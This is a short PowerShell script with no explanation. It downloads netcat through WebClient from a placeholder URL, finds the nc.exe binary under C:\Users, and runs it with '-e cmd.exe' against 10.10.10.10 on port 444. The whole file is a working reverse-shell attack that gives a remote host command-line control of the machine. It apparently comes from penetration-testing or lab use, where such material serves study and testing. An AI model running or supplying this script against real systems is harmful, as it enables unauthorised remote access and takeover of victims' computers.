$down = New-Object System.Net.WebClient
$url  = 'link of NC';
$file = 'nc.exe';
$down.DownloadFile($url,$file);
$z=gci C:\Users -Filter nc.exe -Recurse | % { $_.FullName } | Select-Object -first 1
$z=Split-Path $z -Parent
sl $z
.\nc 10.10.10.10 444 -e cmd.exe
